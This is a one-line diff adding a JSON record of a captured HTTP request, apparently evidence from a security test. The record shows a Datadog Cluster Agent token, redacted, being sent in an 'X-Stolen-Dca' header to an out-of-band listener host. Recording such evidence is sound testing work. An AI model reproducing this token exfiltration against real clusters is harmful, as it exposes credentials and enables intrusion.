@@ -1,0 +1,1 @@
+{"method": "GET", "path": "/svc-dca-50612b1e573162db", "headers": {"Host": "oast.evidence.svc.cluster.local:8080", "User-Agent": "Datadog Agent/7.85.4", "Accept": "*/*", "Accept-Encoding": "gzip, deflate", "X-Stolen-Dca": "<REDACTED_DCA_TOKEN>"}, "body": ""}
